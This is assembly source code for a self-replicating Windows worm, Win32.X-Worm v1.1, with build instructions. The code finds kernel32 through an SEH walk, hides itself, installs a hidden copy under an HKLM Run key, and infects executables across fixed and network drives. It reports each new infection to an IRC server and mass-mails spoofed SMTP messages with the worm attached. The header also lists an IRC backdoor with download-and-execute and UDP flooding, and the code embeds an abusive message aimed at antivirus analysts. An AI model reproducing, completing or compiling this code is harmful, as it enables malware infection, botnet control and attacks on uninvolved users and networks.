;-----------------------------------------------------------------------|
; .,::      .:     .::    .   .:::  ...    :::::::..   .        :   	|
;  `;;;,  .,;;     ';;,  ;;  ;;;'.;;;;;;;. ;;;;``;;;;  ;;,.    ;;;  	|
;    '[[,,[['      '[[, [[, [[',[[     \[[,[[[,/[[['  [[[[, ,[[[[, 	|
;     Y$$$Pcccccccc  Y$c$$$c$P $$$,     $$$$$$$$$c    $$$$$$$$"$$$ 	|
;   oP"``"Yo,         "88"888  "888,_ _,88P888b "88bo,888 Y88" 888o	|
;,m"       "Mm,        "M "M"    "YMMMMMP" MMMM   "W" MMM  M'  "MMM	|
;:::::::..-:.     ::-.  :::::::-.  :::::::..  	.,:::::: .-:::::'	|
; ;;;'';;'';;.   ;;;;'   ;;,   `';,;;;;``;;;;	;;;;'''' ;;;'''' 	|
; [[[__[[\. '[[,[[['     `[[     [[ [[[,/[[[' 	 [[cccc  [[[,,== 	|
; $$""""Y$$   c$$"        $$,    $$ $$$$$$ccccccc$$""""  `$$$"``	| 
;_88o,,od8P ,8P"`         888_,o8P' 888b "88bo,	 888oo,__ 888  		|  
;""YUMMMP" mM"            MMMMP"`   MMMM   "W"	 """"YUMMM"MM, 		|
;									|
;-----------------------------------------------------------------------|
;	  	Win32.X-Worm v1.1(c) DR-EF 2006				|
;-----------------------------------------------------------------------|
;Virus Name	: Win32.X-Worm v1.1					|
;Virus Size	: 60kb							|
;Virus Type	: Polymorphic PE\RAR Infector & Massmailer & Backdoor	|
;Author		: DR-EF							|
;Author Homepage: http://home.arcor.de/dr-ef/				|
;									|
;Virus Features	:							|
;----------------							|
;		1)infect files by injecting loader code and		|
;		  copy itself to the file directory,loader		|
;		  execute the virus,if the virus deleted host		|
;		  wont work anymore					|
;		2)virus is encrypted & polymorphed by 3 layers		|
;		  using VPE,BGPE by BlueOwl/rrlf & ETMS by		|
;		  b0z0/ikx  engines,the pe header of the virus		|
;		  file is changble too					|
;		3)virus can add itself to .rar archives			|
;		4)virus find kernel32 base by using SEH walker		|
;		5)scan all drivers from c~z to find files		|
;		6)does not infect sfc protected files & files		|
;		  with names of av programs				|
;		7)injected loader is polymorphed			|
;									|
;Mail Worm Features:							|
;-------------------							|
;		1)x-worm got its own smtp engine & base64 encoder	|
;		2)find mails at txt,html,rtf,doc,dbx,php,jsp,cgi	|
;		  files							|
;		3)using email-ripper engine published in 29a#6		|
;		4)using word creation engine by BlueOwl			|
;		5)fake sender address					|
;		6)2 types of mails					|
;									|
;Backdoor Features:							|
;-----------------							|
;		1)autorun at system startup				|
;		2)irc bot that support:					|
;		 a)download & execute file				|
;		 b)waste bandwidth of websites by over-downloading file |
;		 c)udp flood ip						|
;									|
;General Malware Features:						|
;-------------------------						|
;		1)add itself to system startup				|
;		2)use mutex to avoid 2 executions at the same time	|
;		3)destructive payload					|
;		4)notify at irc for every new infection			|
;		5)run as service process under win9x/me			|
;									|
;Source Code Features:							|
;---------------------							|
;		1)Debug Version Switch					|
;									|
;	Big Thanks to BlueOwl for coding a great premutator		|
;	 engine for the loader of this edition of x-worm 		|
;									|
;To Compile:								|
;-----------								|
;									|
;	tasm32 /m3 /ml /zi xworm.asm , , ;				|
;	tlink32 /tpe /aa /v xworm , xworm,,import32.lib			|
;									|
;-----------------------------------------------------------------------|


.586
.model flat




	extrn GetProcAddress:proc


	DEBUG		equ	0			;debug version ?

	
	VirusSizeX4	equ	(((virus_end-virus_start)+3)/4)*4
	VirusSizeX1	equ	(virus_end-virus_start)
	data_sec_size	equ	(virus_end-x_main)

.data


x_main:

	Decryptor2	db	1024*6	dup(90h)


virus_start	equ	$


	call	xdelta
xdelta:	pop	ebp
	sub	ebp,offset xdelta
	
        mov 	eax,fs:[0]				;find kernel using SEH walker
search_last:
        mov 	edx,[eax]
        inc 	edx
        jz 	found_last
        dec 	edx
        xchg 	edx,eax
        jmp 	search_last
found_last:
        mov 	eax,[eax+4]
        and 	eax,0ffff0000h
search_mz:
        cmp 	word ptr [eax],'ZM'
        jz 	found_mz
        sub 	eax,10000h
        jmp 	search_mz
found_mz:
	mov	[ebp + kernel32base],eax
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[ebp + kernel32base]
	;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[ebp + kernel32base]
	mov	edi,[eax]
	add	edi,[ebp + kernel32base]
	;edi - api names array
	cld
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax
	;eax - kernel32 export table
	;edx - GetProcAddress position
	shl	edx,1h
	mov	ebx,[eax + 24h]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[ebp + kernel32base]
	mov	[ebp + __GetProcAddress],ebx
	
	mov	edx,[ebp + kernel32base]
	mov	ecx,NumberOfApis
IF	DEBUG
	inc	ecx
ENDIF
	lea	ebx,[ebp + ApiAddressTable]
	lea	eax,[ebp + ApiNamesTable]
	clc
	call	GetNextAPI				;start to get apis using a lookup table
	jc	@2
	ret
@2:	call	prsp
	db	"RegisterServiceProcess",0
prsp:	push	[ebp + kernel32base]
	call	[ebp +  __GetProcAddress]
	or	eax,eax
	je	no_rsp
	push	1
	push	0
	call	eax					;hide our process on win9x/me
no_rsp:	clc	

	call	GenMorphedWorm				;create a polymorphed encrypted worm	
	jnc	ExitWorm

	call	GetUser32Apis				;get apis from user32 library
	call	GetWinsockApis				;get apis from winsock library
	call	GetADVAPI32Apis				;get apis from advapi32 library
		
	;load sfc library & get IsFileProtected api
	
	mov	[ebp + SfcIsFileProtected],0h		;assume no sfc
	lea	eax,[ebp + SFC_DLL]
	push	eax
	call	[ebp + LoadLibrary]			;load sfc library
	or	eax,eax					;sfc here ?
	je	NoSfc					;we not under xp\2000
	lea	ebx,[ebp + _SfcIsFileProtected]
	push	ebx
	push	eax					;sfc module handle
	call	[ebp + __GetProcAddress]
	or	eax,eax					;function not founded ?
	je	NoSfc
	mov	[ebp + SfcIsFileProtected],eax		;save function address	
NoSfc:	

	call	AllowOnlyOneRun				;run the worm only 1 time
	jnc	ExitWorm

;drop backdoor
;*************************************************
	
	call	PushTID2
	dd	0					;thread id
PushTID2:
	xor	eax,eax
	push	eax
	push	eax
	lea	ebx,[ebp + Backdoor]
	push	ebx
	push	eax
	push	eax
	call	[ebp + CreateThread]			;create thread to drop backdoor
	
	
;add autorun key/send notify message
;*************************************************

	call	SetAutoRun
			
;check for payload day
;*************************************************

	mov	byte ptr [ebp + PayloadDay],0h

	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]
	
	cmp	word ptr [ebp + wDay],29d
	jne	NoPayLoad
	
	inc	byte ptr [ebp + PayloadDay]		;killing flag

NoPayLoad:

;scan all drivers from c ~ z for .exe & .rar files
;*************************************************

	mov	byte ptr [ebp + StartDrive],'z'		;set start drive
	
InfectNxtDrive:
	
	;check if drive is remote or fixed
	
	
	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + GetDriveType]
	cmp	eax,DRIVE_FIXED
	je	InfectIt
	cmp	eax,DRIVE_REMOTE
	jne	SkipDrive
InfectIt:

IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + DriveInfectionWarning]
	push	eax
	lea	eax,[ebp + StartDrive]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	SkipDrive
ENDIF	

	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	je	SkipDrive

	call	InfectDrive

SkipDrive:	
	dec	byte ptr [ebp + StartDrive]
	cmp	byte ptr [ebp + StartDrive],'b'
	
	jne	InfectNxtDrive
	
	cmp	byte ptr [ebp + PayloadDay],1h
	jne	MassMail
	
	push	MB_ICONINFORMATION
	lea	eax,[ebp + CopyRight]
	push	eax
	push	eax
	push	0h
	call	[ebp + MessageBox]			;show payload MessageBox	

MassMail:

	push	(5*1000)
	call	[ebp + Sleep]				;sleep for 5 minutes
	
	mov	byte ptr [ebp + use_rar_file],0h

	call	GenRandomNumber
	cmp	al,80h
	ja	@UseRar

	call	CreateVirusBase64Image
	jnc	ExitWorm
	
	jmp	WSASup
	
@UseRar:mov	byte ptr [ebp + use_rar_file],1h
	call	CreateVirusRarFile
	call	CreateVirusBase64Image
	jnc	ExitWorm

WSASup:	lea	eax,[ebp + WSADATA]
	push	eax
	push	VERSION1_1
	call	[ebp + WSAStartup]			;start up winsock
	cmp	eax,0h
	jne	ExitWorm
	
	mov	byte ptr [ebp + StartDrive],'z'		;set start drive
		
SearchNxtDrive:
	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + GetDriveType]
	cmp	eax,DRIVE_FIXED
	je	ScanIt
	cmp	eax,DRIVE_REMOTE
	jne	_SkipDrive
ScanIt:	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	je	_SkipDrive
	call	ScanDrive
_SkipDrive:
	dec	byte ptr [ebp + StartDrive]
	cmp	byte ptr [ebp + StartDrive],'b'
	jne	SearchNxtDrive	
	
	call	[ebp + WSACleanup]
	
	push	[ebp + base64outputmem]
	call	[ebp + GlobalFree]

ExitWorm:
	push	eax
	call	[ebp + ExitProcess]				;we done
	
	;a little message for avers ;)
	
	db	0dh,0ah,"[Welcome to Win32.X-Worm by DR-EF]",0dh,0ah
	db	"to whoever who is Analyzing That code now,i wish you will die",0dh,0ah
	db	"i just hate scums like you,the antivirus piece of shit people",0dh,0ah
	db	"you all suck,all antivirus people are just fucked up morons!",0dh,0ah
	db	"so if you(the scum who reading that now)is working at antivirus",0dh,0ah
	db	"company,i can only say one thing to you,FUCK YOU",0dh,0ah,0dh,0ah
	
SetAutoRun:

	push	0ffh
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + GetWindowsDirectory]			;get windows directory
	lea	edi,[ebp + auturun_copy_path]
nextWC:	cmp	byte ptr [edi],0h
	je	SFP
	inc	edi
	jmp	nextWC
SFP:	lea	esi,[ebp + worm_file]
	mov	ecx,SizeOfWormFile
	rep	movsb
	
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + GetFileAttributes]
	and	eax,FILE_ATTRIBUTE_READONLY
	cmp	eax,FILE_ATTRIBUTE_READONLY
	je	NoNotify
		
	call	overTIx
	dd	0
overTIx:xor	eax,eax	
	push	eax
	push	eax
	lea	ebx,[ebp + InfectionNotify]
	push	ebx
	push	eax
	push	eax
	
	call	[ebp + CreateThread]	
	
NoNotify:
	push	0h
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	lea	eax,[ebp + MorphedWorm]
	push	eax
	call	[ebp + CopyFile]				;copy worm file
	
	push	FILE_ATTRIBUTE_HIDDEN
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + SetFileAttributes]			;hide it
	
	lea	eax,[ebp + hkey]
	push	eax
	push	KEY_WRITE
	push	0h
	lea	eax,[ebp + runkey]
	push	eax
	push	HKEY_LOCAL_MACHINE
	call	[ebp + RegOpenKeyEx]				;open key
	cmp	eax,ERROR_SUCCESS
	jne	ExtAt
	
	push	SizeOFACP
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	push	REG_SZ
	push	0h
	lea	eax,[ebp + auturun_name]
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegSetValueEx]				;setup autorun value
	
	push	[ebp + hkey]
	call	[ebp + RegCloseKey]				;done !
	
ExtAt:	ret
	
	auturun_name	db	"x32x",0h
	
	worm_file:
		db	"\xwrm.exe",0h
		SizeOfWormFile	equ	($-worm_file)	
	
	
	auturun_copy_path:
		db	0ffh	dup(0)
		SizeOFACP	equ	($-auturun_copy_path)
	
	hkey		dd	0
	
	runkey	db	"Software\Microsoft\Windows\CurrentVersion\Run",0h
	
	HKEY_LOCAL_MACHINE	equ	80000002h
	ERROR_SUCCESS		equ	0h
	KEY_WRITE		equ	00020006h
	REG_SZ			equ	1h
	
	
InfectionNotify:

	call	Ndelta
Ndelta:	pop	ebp
	sub	ebp,offset Ndelta
	
	lea	eax,[ebp + WSADATA2]
	push	eax
	push	VERSION1_1
	call	[ebp + WSAStartup]			;start up winsock
	cmp	eax,0h
	jne	ExitNotify
	push	IPPROTO_TCP
	push	SOCK_STREAM
	push	AF_INET
	call	[ebp + socket]				;create socket
	cmp	eax,SOCKET_ERR
	je	ExitNotify
	mov	dword ptr [ebp + nsocket],eax
	push	6667					;irc
	call	[ebp + htons]
	
	mov	word ptr [ebp + sin_port_],ax
	mov	word ptr [ebp + sin_family_],AF_INET
	lea	eax,[ebp + irc_server_addr]
	push	eax
	call	[ebp + gethostbyname]
		
	or	eax,eax
	je	EN_Cs
	mov	eax,dword ptr [eax + HOSTENT_IP]
	mov	eax,dword ptr [eax]
	mov	eax,dword ptr [eax]
	mov	dword ptr [ebp + sin_addr_],eax
	push	SizeOfSOCKADDR_
	lea	eax,[ebp + SOCKADDR2]
	push	eax
	push	dword ptr [ebp + nsocket]
	call	[ebp + connect]
	or	eax,eax
	jne	EN_Cs

	push	(2*1000)
	call	[ebp + Sleep]	

	mov	ecx,3h
	lea	edi,[ebp + iuser]
@grnds:	push	ecx
	mov	ecx,7h
@rndl:	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@rndl
	mov	byte ptr [edi],0h
	inc	edi
	pop	ecx
	loop	@grnds

	lea	eax,[ebp + irealname]
	push	eax
	lea	eax,[ebp + iuser]
	push	eax
	call	puser
	db	"USER %s 8 * :%s",0dh,0ah,0h
puser:	lea	eax,[ebp + ircbuffer]
	push	eax
	call	[ebp + wsprintf]
	
	add	esp,(4*4)
	
	push	0h
	push	eax
	lea	eax,[ebp + ircbuffer]
	push	eax
	push	[ebp + nsocket]
	call	[ebp + send]
	
	lea	eax,[ebp + inick]
	push	eax
	call	pnick
	db	"NICK %s",0dh,0ah,0h
pnick:	lea	eax,[ebp + ircbuffer]
	push	eax
	call	[ebp + wsprintf]
	
	add	esp,(3*4)
	
	push	0h
	push	eax
	lea	eax,[ebp + ircbuffer]
	push	eax
	push	[ebp + nsocket]
	call	[ebp + send]	
		
	mov	ecx,4h
@GetPng:push	ecx
	
	call	_xrecv
	or	eax,eax
	je	EN_Cs
	cmp	eax,SOCKET_ERR
	je	EN_Cs
	
	mov	ecx,eax
	sub	ecx,4h
	lea	eax,[ebp + xGetBuffer]
	
@FindPing:
	cmp	dword ptr [eax],"GNIP"
	je	ProcessPng
	inc	eax
	loop	@FindPing
	pop	ecx
	loop	@GetPng
	jmp	EN_Cs

ProcessPng:
	pop	ecx

	add	eax,6h
	mov	esi,eax
	lea	edi,[ebp + xpong]
	
cpypb:	cmp	byte ptr [esi],0dh
	je	endPc
	movsb
	jmp	cpypb
	
endPc:	mov	byte ptr [edi+1],0h

	lea	eax,[ebp + xpong]
	push	eax
	call	ppong
	db	"PONG %s",0dh,0ah,0h
ppong:	lea	eax,[ebp + ircbuffer]
	push	eax
	call	[ebp + wsprintf]
	
	add	esp,(3*4)
				
	push	0h
	push	eax
	lea	eax,[ebp + ircbuffer]
	push	eax
	push	[ebp + nsocket]
	call	[ebp + send]		
	
	call	_xrecv
	or	eax,eax
	je	EN_Cs
	cmp	eax,SOCKET_ERR
	je	EN_Cs
	
	mov	ecx,xSizeOfGB
	
	lea	eax,[ebp + xGetBuffer]	
@fWelcome:
	cmp	dword ptr [eax],"100 "
	je	ConSucc
	cmp	byte ptr [eax],0dh
	je	EN_Cs
	inc	eax
	dec	ecx
	cmp	ecx,0h
	jne	@fWelcome
	jmp	EN_Cs
	
ConSucc:push	0h
	push	SizeOfJOIN
	call	O_J
xjoin	db	"JOIN #england",0dh,0ah
	SizeOfJOIN	equ	($-xjoin)
O_J:	push	dword ptr [ebp + nsocket]
	call	[ebp + send]
	
	push	1000
	call	[ebp + Sleep]

	push	0h
	push	SizeOfPMSG
	call	O_P
xpmsg	db	"PRIVMSG #england :.-:[X-Worm]:-.",0dh,0ah
	SizeOfPMSG	equ	($-xpmsg)
O_P:	push	dword ptr [ebp + nsocket]
	call	[ebp + send]	
	
	push	1000
	call	[ebp + Sleep]
		
	push	0h
	push	SizeOfQUIT
	call	O_Q
xquit	db	"QUIT .-:[X-Worm]:-.",0dh,0ah
	SizeOfQUIT	equ	($-xquit)
O_Q:	push	dword ptr [ebp + nsocket]
	call	[ebp + send]
		
	push	1000
	call	[ebp + Sleep]	
	
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + SetFileAttributes]			;hide it	
	
EN_Cs:	push	dword ptr [ebp + nsocket]
	call	[ebp + closesocket]
ExitNotify:
	push	eax
	call	[ebp + ExitThread]
	
_xrecv:	push	0h
	push	xSizeOfGB
	call	PushGBx
	xSizeOfGB	equ	(PushGBx-$)
	xGetBuffer	db	0200h	dup(0)
PushGBx:push	dword ptr [ebp + nsocket]
	call	[ebp + recv]
	ret	
	
	xpong			db	32d	dup(0)
	
	iuser			db	8d	dup(0)
	inick			db	8d	dup(0)
	irealname		db	8d	dup(0)
	
	
	ircbuffer		db	0ffh	dup(0)
	
	irc_server_addr		db	"irc.undernet.org",0h
	
	
	nsocket		dd	0
	
	
WSADATA2:	
	mVersion_	dw	0
	mHighVersion_	dw	0
	szDescription_	db	257 dup(0)
	szSystemStatus_	db	129 dup(0)
	iMaxSockets_	dw	0
	iMaxUpdDg_	dw	0
	lpVendorInfo_	dd	0	
	
	
SOCKADDR2:
	sin_family_	dw	0	
	sin_port_	dw	0
	sin_addr_       dd      0       
	sin_zero_	db	8 dup(0)
	SizeOfSOCKADDR_	equ	($-SOCKADDR2)		
	
	
	
AllowOnlyOneRun:
	;use mutex to check if we already running
	lea	eax,[ebp + CopyRight]
	push	eax
	push	0h
	push	MUTEX_ALL_ACCESS
	call	[ebp + OpenMutex]
	cmp	eax,0h
	jne	AlreadyRun
	lea	eax,[ebp + CopyRight]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + CreateMutex]
	stc
	ret
AlreadyRun:
	clc
	ret
	
	MUTEX_ALL_ACCESS	equ	001F0001h
	
	
	
	
SYSTEMTIME:
	wYear		dw	0
	wMonth		dw	0
	wDayOfWeek	dw	0
	wDay		dw	0
	wHour		dw	0
	wMinute		dw	0
	wSecond		dw	0
	wMilliseconds	dw	0	
	
	
	PayloadDay		db	0
	

;MailAddr	 = reciver mail
;vsocket	 = smtp server connection socket
;use_rar_file 	 = send rar/exe file ?
;base64outputmem = base64 encoded worm
;sizeofbase64out = size of base64 data
TransferWorm:
	call	__recv						;recive welcome message
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 022"
	jne	Disconnect
	push	0h
	push	SizeOfHELO
	call	O_HL
xhelo	db	"HELO <localhost>",0dh,0ah
	SizeOfHELO	equ	($-xhelo)
O_HL:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv					;get helo response
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 052"		;is 250 ?
	jne	Disconnect
	
	mov	ecx,SizeOfBoundary
	lea	edi,[ebp + boundry]
@x_RndLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@x_RndLetter			;generate boundary id

	call	GenRandomNumber
	cmp	al,80h				;select mail type
	ja	m2
	mov	byte ptr [ebp + MailType],1h	;failed sending msg
	jmp	m_x
m2:	mov	byte ptr [ebp + MailType],0h	;love letter msg
m_x:	cmp	byte ptr [ebp + MailType],1h
	jne	LoveMsg
	
	call	GenRandomNumber
	
	and	eax,7000h
	cmp	eax,1000h
	ja	mf1
	lea	esi,[ebp + frm1]
	jmp	GenMF
mf1:	cmp	eax,2000h
	ja	mf2
	lea	esi,[ebp + frm2]
	jmp	GenMF
mf2:	cmp	eax,3000h
	ja	mf3
	lea	esi,[ebp + frm3]
	jmp	GenMF
mf3:	cmp	eax,4000h
	ja	mf4
	lea	esi,[ebp + frm4]
	jmp	GenMF
mf4:	cmp	eax,5000h
	ja	mf5
	lea	esi,[ebp + frm5]
	jmp	GenMF
mf5:	cmp	eax,6000h
	ja	mf6
	lea	esi,[ebp + frm6]
	jmp	GenMF
mf6:	lea	esi,[ebp + frm7]
GenMF:	lea	edi,[ebp + faked_mfrm]
	xor	ecx,ecx
nxtmfb:	cmp	byte ptr [esi+ecx],0h
	je	cpymf
	inc	ecx
	jmp	nxtmfb
cpymf:	inc	ecx
	rep	movsb
	dec	edi
	lea	esi,[ebp + MailAddr]
NxtDmc:	cmp	byte ptr [esi],'@'
	je	getDom
	inc	esi
	jmp	NxtDmc
getDom:	cmp	byte ptr [esi+ecx],0h
	je	CpyDom
	inc	ecx
	jmp	getDom
CpyDom:	inc	ecx
	rep	movsb
	
	push	4000h					;allocate 16kb of memory used 
	push	GPTR					;as dynamic mail buffer
	call	[ebp + GlobalAlloc]			
	or	eax,eax
	je	QuitM
	
	mov	[ebp + MailBuffer],eax			;save allocated memory handle
	
	lea	eax,[ebp + faked_mfrm]
	push	eax	
	call	PushMf	
	db	"MAIL FROM:<%s>",0dh,0ah,0h
PushMf:	push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create MAIL FROM command
	add	esp,(3*4)
	
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	lea	eax,[ebp + MailAddr]
	push	eax	
	call	PushRC
	db	"RCPT TO:<%s>",0dh,0ah,0h
PushRC:	push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create RCPT command
	add	esp,(3*4)

	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
		
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	push	0h
	push	SizeOfDATA
	call	O_DT
xDATA	db	"DATA",0dh,0ah
	SizeOfDATA	equ	($-xDATA)
O_DT:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]					;send DATA command
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv						;get data response
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 453"		;is 354 ?
	jne	Disconnect
	
	;generate message in memory
	
	mov	ecx,2h
	
@xfn:	cmp	byte ptr [ebp + use_rar_file],1h
	jne	sexe
	lea	esi,[ebp +rar_suffix]
	jmp	___z
sexe:	lea	esi,[ebp +exe_suffix]
___z:	push	esi	
	
	cmp	ecx,2h
	jne	NotRnd
	call	GenRandomNumber
	
	and	eax,7000h
NotRnd:	cmp	eax,1000h
	ja	xat1
	lea	esi,[ebp + atch1]
	jmp	PFn
xat1:	cmp	eax,2000h
	ja	xat2
	lea	esi,[ebp + atch2]
	jmp	PFn
xat2:	cmp	eax,3000h
	ja	xat3
	lea	esi,[ebp + atch3]
	jmp	PFn
xat3:	cmp	eax,4000h
	ja	xat4
	lea	esi,[ebp + atch4]
	jmp	PFn
xat4:	cmp	eax,5000h
	ja	xat5
	lea	esi,[ebp + atch5]
	jmp	PFn
xat5:	cmp	eax,6000h
	ja	xat6
	lea	esi,[ebp + atch6]
	jmp	PFn
xat6:	lea	esi,[ebp + atch7]

PFn:	push	esi
	
	dec	ecx
	cmp	ecx,0h
	jne	@xfn					;2 times file + suffix
	
	lea	eax,[ebp + boundry]
	push	eax					;boundary
	
	call	GenRandomNumber
	
	and	eax,6000h
	cmp	eax,1000h
	ja	x_msg1
	lea	esi,[ebp + msg1]
	jmp	Pmsg
x_msg1:	cmp	eax,2000h
	ja	x_msg2
	lea	esi,[ebp + msg2]
	jmp	Pmsg
x_msg2:	cmp	eax,3000h
	ja	x_msg3
	lea	esi,[ebp + msg3]
	jmp	Pmsg
x_msg3:	cmp	eax,4000h
	ja	x_msg4
	lea	esi,[ebp + msg4]
	jmp	Pmsg
x_msg4:	cmp	eax,5000h
	ja	x_msg5
	lea	esi,[ebp + msg5]
	jmp	Pmsg
x_msg5:	lea	esi,[ebp + msg6]
Pmsg:	push	esi					;message
	
	lea	eax,[ebp + boundry]
	push	eax					;boundary
		
	lea	eax,[ebp + boundry]
	push	eax					;boundary
			
	call	GenRandomNumber
	
	and	eax,3000h
	cmp	eax,1000h
	ja	x_sub1
	lea	esi,[ebp + sub1]
	jmp	Psub
x_sub1:	cmp	eax,2000h
	ja	x_sub2
	lea	esi,[ebp + sub2]
	jmp	Psub
x_sub2:	lea	esi,[ebp + sub3]
Psub:	push	esi					;subject
	
	lea	eax,[ebp + MailAddr]
	push	eax					;mail to
	
	lea	eax,[ebp + faked_mfrm]
	push	eax					;mail from
	
	lea	eax,[ebp + MailHeader]
	push	eax					;formated string
	
	push	[ebp + MailBuffer]
	
	call	[ebp + wsprintf]			;create mime message
	
	add	esp,(13*4)				;restore stack
		
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]	

	jmp	SndAtt
	
LoveMsg:
	call	GenRandomNumber
	mov	ecx,6h
	push	ecx
	lea	edi,[ebp + faked_mfrm]
@x__RndLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@x__RndLetter
	lea	edi,[ebp + faked_mfrm]
	pop	ecx
	add	edi,ecx
	lea	esi,[ebp + MailAddr]
NxtDmc_:cmp	byte ptr [esi],'@'
	je	getDom_
	inc	esi
	jmp	NxtDmc_
getDom_:cmp	byte ptr [esi+ecx],0h
	je	CpyDom_
	inc	ecx
	jmp	getDom_
CpyDom_:inc	ecx
	rep	movsb
	
	push	4000h					;allocate 16kb of memory used 
	push	GPTR					;as dynamic mail buffer
	call	[ebp + GlobalAlloc]			
	or	eax,eax
	je	QuitM
	
	mov	[ebp + MailBuffer],eax			;save allocated memory handle
	
	lea	eax,[ebp + faked_mfrm]
	push	eax	
	call	PushMf_
	db	"MAIL FROM:<%s>",0dh,0ah,0h
PushMf_:push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create MAIL FROM command
	add	esp,(3*4)
	
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	lea	eax,[ebp + MailAddr]
	push	eax	
	call	PushRC_
	db	"RCPT TO:<%s>",0dh,0ah,0h
PushRC_:push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create RCPT command
	add	esp,(3*4)

	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	push	0h
	push	SizeOfDATA
	call	O_DT_
	db	"DATA",0dh,0ah
O_DT_:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]					;send DATA command
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv						;get data response
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 453"		;is 354 ?
	jne	Disconnect
	
	;generate message in memory
	
	mov	ecx,2h
	
@xfn_:	cmp	byte ptr [ebp + use_rar_file],1h
	jne	sexe_
	lea	esi,[ebp +rar_suffix]
	jmp	___z_
sexe_:	lea	esi,[ebp +exe_suffix]
___z_:	push	esi	
	
	cmp	ecx,2h
	jne	NotRnd_
	call	GenRandomNumber
	
	and	eax,8000h
NotRnd_:cmp	eax,1000h
	ja	xat1_
	lea	esi,[ebp + xattch1]
	jmp	PFn_
xat1_:	cmp	eax,2000h
	ja	xat2_
	lea	esi,[ebp + xattch2]
	jmp	PFn_
xat2_:	cmp	eax,3000h
	ja	xat3_
	lea	esi,[ebp + xattch3]
	jmp	PFn_
xat3_:	cmp	eax,4000h
	ja	xat4_
	lea	esi,[ebp + xattch4]
	jmp	PFn_
xat4_:	cmp	eax,5000h
	ja	xat5_
	lea	esi,[ebp + xattch5]
	jmp	PFn_
xat5_:	cmp	eax,6000h
	ja	xat6_
	lea	esi,[ebp + xattch6]
	jmp	PFn_
xat6_:	cmp	eax,7000h
	ja	xat7_
	lea	esi,[ebp + xattch7]
	jmp	PFn_
xat7_:	lea	esi,[ebp + xattch8]

PFn_:	push	esi
	
	dec	ecx
	cmp	ecx,0h
	jne	@xfn_					;2 times file + suffix
	
